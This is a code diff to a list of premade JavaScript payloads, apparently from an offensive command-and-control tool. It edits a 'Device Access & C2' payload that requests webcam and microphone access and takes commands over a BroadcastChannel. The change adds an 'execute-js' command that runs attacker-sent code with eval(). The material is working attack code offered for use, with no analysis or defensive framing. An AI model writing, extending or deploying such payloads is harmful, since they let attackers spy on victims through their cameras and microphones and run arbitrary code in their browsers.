@@ -183,7 +183,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     },
     {
         name: "Device Access & C2",
-        description: "Requests webcam/mic access and listens for C2 commands to stream media.",
+        description: "Requests webcam/mic access and listens for C2 commands.",
         code: `
 (function() {
     const channel = new BroadcastChannel('netrax_c2_channel');
@@ -279,7 +279,16 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     channel.addEventListener('message', async (event) => {
         if (event.data.type !== 'command' || (event.data.sessionId && event.data.sessionId !== sessionId)) return;
         
-        const { command } = event.data;
+        const { command, code } = event.data;
+
+        if (command === 'execute-js' && code) {
+            try {
+                eval(code);
+            } catch(e) {
+                console.error("C2 command execution failed:", e);
+            }
+            return;
+        }
         
         if (command === 'start-video') {
             const stream = await getMediaPermissions(true, true);
